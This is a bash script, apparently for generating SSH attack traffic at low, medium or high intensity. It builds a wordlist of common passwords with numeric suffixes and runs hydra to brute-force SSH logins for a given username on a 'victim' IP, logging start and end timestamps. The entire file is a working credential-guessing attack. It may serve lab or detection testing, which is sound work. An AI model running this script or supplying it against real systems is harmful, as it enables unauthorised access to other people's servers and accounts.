#!/usr/bin/env bash
set -euo pipefail

VICTIM_IP="${1:?Usage: ssh_bruteforce.sh <victim_ip> <username> <low|medium|high>}"
USERNAME="${2:?Usage: ssh_bruteforce.sh <victim_ip> <username> <low|medium|high>}"
INTENSITY="${3:-medium}"

case "$INTENSITY" in
  low)    THREADS=1; WORDS=5  ;;
  medium) THREADS=4; WORDS=15 ;;
  high)   THREADS=16; WORDS=40 ;;
  *) echo "intensity must be low|medium|high"; exit 1 ;;
esac

echo "=== ssh_bruteforce ($INTENSITY) ==="
echo "target=${VICTIM_IP} user=${USERNAME} threads=${THREADS} words=${WORDS}"
echo "start_ts=$(date -Iseconds)"

WORDLIST=$(mktemp)
BASE_WORDS=(123456 password admin letmein qwerty changeme welcome1 iloveyou
            monkey dragon football baseball trustno1 sunshine princess
            master hello freedom whatever qazwsx 1234567 12345678 abc123
            111111 000000 zaq1zaq1 login passw0rd starwars solo)
for ((i=0; i<WORDS; i++)); do
  echo "${BASE_WORDS[$((i % ${#BASE_WORDS[@]}))]}${i}" >> "$WORDLIST"
done

hydra -l "$USERNAME" -P "$WORDLIST" -t "$THREADS" -f "ssh://${VICTIM_IP}" || true
rm -f "$WORDLIST"

echo "end_ts=$(date -Iseconds)"
echo "=== ssh_bruteforce complete ==="